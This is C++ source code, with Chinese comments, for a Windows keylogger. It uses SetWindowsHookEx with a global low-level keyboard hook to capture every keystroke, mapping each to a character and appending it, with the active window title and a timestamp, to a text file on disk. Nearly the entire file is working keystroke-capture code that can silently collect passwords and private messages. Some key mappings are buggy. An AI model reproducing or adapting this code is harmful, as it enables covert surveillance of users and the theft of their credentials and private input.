//  使用SetWindowsHookEx实现键盘记录器
#include <Windows.h>
#include <string>
#include <fstream>
#include <sstream>
#include <iostream>
#include "键盘消息Hook.h"
#include "vld.h"
//  全局键盘Hook句柄
HHOOK kKeyboardHook;
//  Shift Key 
BOOL bShift = FALSE;
//  存放键盘消息
std::string fileName = "D:\\test.txt";
//  Windows Title Text -260 char-
char cWindow[1000];
//  NULL is ok
HWND lastWindow = NULL;
int main()
{
    std::cout << "start !" << std::endl;
    //  设置键盘钩子
    if (!HookKeyBoard())
    {
        std::cout << "Hook KeyBoard Failed!" << std::endl;
    }
    unhookKeyboard();//释放hook
}

/********************************************************
函数作用：设置键盘钩子
返回值：是否hook成功
*********************************************************/
BOOL HookKeyBoard()
{
    BOOL bRet = FALSE;

    kKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, //  low-level keyboard input events
                                    HookProcedure, //  回调函数地址
                                    GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
                                    NULL //线程ID，欲勾住的线程（为0则不指定，全局）
    );
    if (!kKeyboardHook) 
    {
        //  如果SetWindowsHookEx 失败
        std::cout << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
    }
    else
    {
        std::cout << "[*] KeyCapture handle ready" << std::endl;
        MSG Msg{};  //  统一初始化
        while (GetMessage(&Msg, NULL, 0, 0) > 0)
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }
        bRet = TRUE;
    }
    return bRet;
}
/********************************************************
函数作用：钩子回调
返回值：是否hook成功
*********************************************************/
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
    std::ofstream myfile(fileName, std::ios::out | std::ios::app);
    BOOL  caps = FALSE;  //  默认大写关闭
    SHORT capsShort = GetKeyState(VK_CAPITAL);
    std::string outPut;
    std::stringstream ssTemp;  //  string 字符流
    if (capsShort > 0)
    {
        //  如果大于0，则大写键按下，说明开启大写；反之小写
        caps = TRUE;
    }
    /*
    WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
    LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
    */
    //  LowLevelKeyboardProc Structure 
    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
    //  wParam和lParam参数包含关于键盘消息的信息。
    if (nCode == HC_ACTION)
    {
        // Messsage data is ready for pickup
        // Check for SHIFT key
        if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
        {
            //  WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
            if (wParam == WM_KEYDOWN)
            {
                bShift = TRUE;
            }
            if (wParam == WM_KEYUP)
            {
                bShift = FALSE;
            }
            else
            {
                bShift = FALSE;
            }
        }
        //  Start Loging keys now we are setup
        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
        {
            //  Retrieves a handle to the foreground window (the window with which the user is currently working).
            HWND currentWindow = GetForegroundWindow();  //  返回前台窗口，获得当前窗口
            //  Check if we need to write new window output
            if (currentWindow != lastWindow)
            {
                SYSTEMTIME t{};
                GetLocalTime(&t);  //  获得当前系统时间
                int day = t.wDay;
                int month = t.wMonth;
                int year = t.wYear;
                int hour = t.wHour;
                int min = t.wMinute;
                int sec = t.wSecond;
                int dayName = t.wDayOfWeek;
                //  Build our output header
                ssTemp << "\n\n[+] " << Dayofweek(dayName) << " - " << day << "/" << month << "/" << year << "  ";
                ssTemp << hour << ":" << min << ":" << sec;
                outPut.append(ssTemp.str());
                ssTemp.clear();
                //  GetWindowTextACCC
                int c = GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
                std::cout << c;
                ssTemp << " - Current Window: " << cWindow << "\n\n";
                //outPut.append(temp.str());
                std::cout << ssTemp.str() << std::endl;
                myfile << ssTemp.str();
                
                // Setup for next CallBackCC
                lastWindow = currentWindow;
            }
            //  Now capture keys
            if (p->vkCode)
            {
                ssTemp.clear();
                ssTemp << HookCode(p->vkCode, caps, bShift);
                std::cout << ssTemp.str();
                myfile << ssTemp.str();
                
            }
            //  Final output logic
        }
    }
    //  hook procedure must pass the message *Always*
    myfile.close();
    return CallNextHookEx(NULL, nCode, wParam, lParam);  //  hook链
}
/********************************************************
函数作用：时间
返回值：返回时间
*********************************************************/
std::string Dayofweek(int code)
{
    // Return Day of the year in text
    std::string name;
    switch (code)
    {
    case 0: name = "[SUNDAY]"; break;
    case 1: name = "[MONDAY]"; break;
    case 2: name = "[TUESDAY]"; break;
    case 3: name = "[WENSDAY]"; break;
    case 4: name = "[THURSDAY]"; break;
    case 5: name = "[FRIDAY]"; break;
    case 6: name = "[SATURDAY]"; break;
    default:
        name = "[UNKOWN]";
    }
    return name;
}


/********************************************************
函数作用：将获得键盘消息转换为字符
参数说明: DWORD code 获得的键盘消息
BOOL caps 是否开启大写
BOOL shift 是否按下shift
返回值：转换的字符
*********************************************************/
std::string HookCode(DWORD code, BOOL caps, BOOL shift)
{
    std::string key;
    switch (code) // SWITCH ON INT
    {
        // Char keys for ASCI
        // No VM Def in header 
    case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
    case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
    case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
    case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
    case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
    case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
    case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
    case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
    case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
    case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
    case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
    case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
    case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
    case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
    case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
    case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
    case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
    case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
    case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
    case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
    case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
    case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
    case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
    case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
    case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
    case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
        // Sleep Key
    case VK_SLEEP: key = "[SLEEP]"; break;
        // Num Keyboard 
    case VK_NUMPAD0:  key = "0"; break;
    case VK_NUMPAD1:  key = "1"; break;
    case VK_NUMPAD2: key = "2"; break;
    case VK_NUMPAD3:  key = "3"; break;
    case VK_NUMPAD4:  key = "4"; break;
    case VK_NUMPAD5:  key = "5"; break;
    case VK_NUMPAD6:  key = "6"; break;
    case VK_NUMPAD7:  key = "7"; break;
    case VK_NUMPAD8:  key = "8"; break;
    case VK_NUMPAD9:  key = "9"; break;
    case VK_MULTIPLY: key = "*"; break;
    case VK_ADD:      key = "+"; break;
    case VK_SEPARATOR: key = "-"; break;
    case VK_SUBTRACT: key = "-"; break;
    case VK_DECIMAL:  key = "."; break;
    case VK_DIVIDE:   key = "/"; break;
        // Function Keys
    case VK_F1:  key = "[F1]"; break;
    case VK_F2:  key = "[F2]"; break;
    case VK_F3:  key = "[F3]"; break;
    case VK_F4:  key = "[F4]"; break;
    case VK_F5:  key = "[F5]"; break;
    case VK_F6:  key = "[F6]"; break;
    case VK_F7:  key = "[F7]"; break;
    case VK_F8:  key = "[F8]"; break;
    case VK_F9:  key = "[F9]"; break;
    case VK_F10:  key = "[F10]"; break;
    case VK_F11:  key = "[F11]"; break;
    case VK_F12:  key = "[F12]"; break;
    case VK_F13:  key = "[F13]"; break;
    case VK_F14:  key = "[F14]"; break;
    case VK_F15:  key = "[F15]"; break;
    case VK_F16:  key = "[F16]"; break;
    case VK_F17:  key = "[F17]"; break;
    case VK_F18:  key = "[F18]"; break;
    case VK_F19:  key = "[F19]"; break;
    case VK_F20:  key = "[F20]"; break;
    case VK_F21:  key = "[F22]"; break;
    case VK_F22:  key = "[F23]"; break;
    case VK_F23:  key = "[F24]"; break;
    case VK_F24:  key = "[F25]"; break;
        // Keys
    case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
    case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
    case VK_BACK:    key = "[BACK]"; break;
    case VK_TAB:     key = "[TAB]"; break;
    case VK_CLEAR:   key = "[CLEAR]"; break;
    case VK_RETURN:  key = "[ENTER]"; break;
    case VK_SHIFT:   key = "[SHIFT]"; break;
    case VK_CONTROL: key = "[CTRL]"; break;
    case VK_MENU:    key = "[ALT]"; break;
    case VK_PAUSE:   key = "[PAUSE]"; break;
    case VK_CAPITAL: key = "[CAP-LOCK]"; break;
    case VK_ESCAPE:  key = "[ESC]"; break;
    case VK_SPACE:   key = "[SPACE]"; break;
    case VK_PRIOR:   key = "[PAGEUP]"; break;
    case VK_NEXT:    key = "[PAGEDOWN]"; break;
    case VK_END:     key = "[END]"; break;
    case VK_HOME:    key = "[HOME]"; break;
    case VK_LEFT:    key = "[LEFT]"; break;
    case VK_UP:      key = "[UP]"; break;
    case VK_RIGHT:   key = "[RIGHT]"; break;
    case VK_DOWN:    key = "[DOWN]"; break;
    case VK_SELECT:  key = "[SELECT]"; break;
    case VK_PRINT:   key = "[PRINT]"; break;
    case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
    case VK_INSERT:  key = "[INS]"; break;
    case VK_DELETE:  key = "[DEL]"; break;
    case VK_HELP:    key = "[HELP]"; break;
        // Number Keys with shift
    case 0x30:  key = shift ? "!" : "1"; break;
    case 0x31:  key = shift ? "@" : "2"; break;
    case 0x32:  key = shift ? "#" : "3"; break;
    case 0x33:  key = shift ? "$" : "4"; break;
    case 0x34:  key = shift ? "%" : "5"; break;
    case 0x35:  key = shift ? "^" : "6"; break;
    case 0x36:  key = shift ? "&" : "7"; break;
    case 0x37:  key = shift ? "*" : "8"; break;
    case 0x38:  key = shift ? "(" : "9"; break;
    case 0x39:  key = shift ? ")" : "0"; break;
        // Windows Keys
    case VK_LWIN:     key = "[WIN]"; break;
    case VK_RWIN:     key = "[WIN]"; break;
    case VK_LSHIFT:   key = "[SHIFT]"; break;
    case VK_RSHIFT:   key = "[SHIFT]"; break;
    case VK_LCONTROL: key = "[CTRL]"; break;
    case VK_RCONTROL: key = "[CTRL]"; break;
        // OEM Keys with shift 
    case VK_OEM_1:      key = shift ? ":" : ";"; break;
    case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
    case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
    case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
    case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
    case VK_OEM_2:      key = shift ? "?" : "/"; break;
    case VK_OEM_3:      key = shift ? "~" : "`"; break;
    case VK_OEM_4:      key = shift ? "{" : "["; break;
    case VK_OEM_5:      key = shift ? "\\" : "|"; break;
    case VK_OEM_6:      key = shift ? "}" : "]"; break;
    case VK_OEM_7:      key = shift ? "'" : "'"; break; //TODO: Escape this char: "
                                                        // Action Keys
    case VK_PLAY:       key = "[PLAY]";
    case VK_ZOOM:       key = "[ZOOM]";
    case VK_OEM_CLEAR:  key = "[CLEAR]";
    case VK_CANCEL:     key = "[CTRL-C]";

    default: key = "[UNK-KEY]"; 
        break;
    }
    return key;
}


/********************************************************
函数作用：释放键盘钩子
返回值： void
*********************************************************/
void unhookKeyboard()
{
    if (kKeyboardHook != 0)
    {
       UnhookWindowsHookEx(kKeyboardHook);
    }
    exit(0);
}